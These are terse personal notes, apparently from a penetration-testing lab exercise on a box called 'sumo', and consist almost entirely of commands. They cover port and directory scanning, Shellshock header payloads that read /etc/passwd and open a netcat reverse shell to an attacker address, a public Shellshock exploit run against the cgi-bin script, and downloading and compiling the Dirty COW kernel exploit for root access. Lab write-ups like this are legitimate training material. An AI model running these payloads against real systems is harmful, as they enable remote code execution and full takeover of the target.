----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# sumo
# 1/2/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
2121/tcp filtered ccproxy-ftp


dirb http://192.168.138.87

dirb http://192.168.138.87cgi-bin /usr/share/wordlists/dirb/big.txt
http://192.168.138.87/cgi-bin/test
 () { :;}; /bin/bash -c ‘nc 192.168.234.166 1337 -e /bin/sh’

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://192.168.138.87/cgi-bin/test 

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'nc 192.168.49.138 1234 -e /bin/sh'" \
http://192.168.138.87/cgi-bin/test 

exploit
https://github.com/b4keSn4ke/CVE-2014-6271
nc -lvnp 1234  
python3 shellshock.py 192.168.49.138 1234 http://192.168.138.87/cgi-bin/test 


uname -a
Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
wget https://www.exploit-db.com/raw/40839 -o cow.c

gcc -pthread cow.c -o dirty -lcrypt